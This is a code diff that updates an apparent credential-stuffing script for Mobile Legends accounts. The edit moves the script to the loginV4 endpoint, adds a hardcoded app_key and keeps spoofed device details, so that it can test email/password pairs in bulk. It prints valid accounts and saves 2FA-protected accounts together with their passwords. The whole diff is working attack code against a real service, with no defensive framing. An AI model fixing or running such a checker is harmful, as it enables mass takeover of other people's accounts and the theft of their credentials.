@@ -75,20 +75,21 @@ async def get_profile(access_token, user_id):
 async def check_account(email, password):
     device, android_version, device_id = generate_device_info()
 
-    login_url = "https://accountmtapi.mobilelegends.com/Account/login"
+    login_url = "https://accountmtapi.mobilelegends.com/Account/loginV4"  # <-- Use loginV4!
     data = {
         "email": email,
         "password": password,
         "os_type": 2,
         "format": 2,
         "secret": "",
+        "app_key": "6da4b03b2d6b1bc2b202665ebd205a1a",  # <-- Correct app_key
         "device": device,
         "device_id": device_id,
-        "app_version": "1.7.82.811.1",  # Update if MLBB updates
+        "app_version": "1.7.82.811.1",
     }
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "User-Agent": f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
     }
 
     for _ in range(3):
@@ -116,7 +117,7 @@ async def check_account(email, password):
                         print(f"[+] Valid account: {email}")
                         return "working"
 
-                    elif code == 403:
+                    elif code == 15001:
                         results["2fa_required"] += 1
                         results["2fa_accounts"].append({"email": email, "password": password})
                         print(f"[!] 2FA required: {email}")
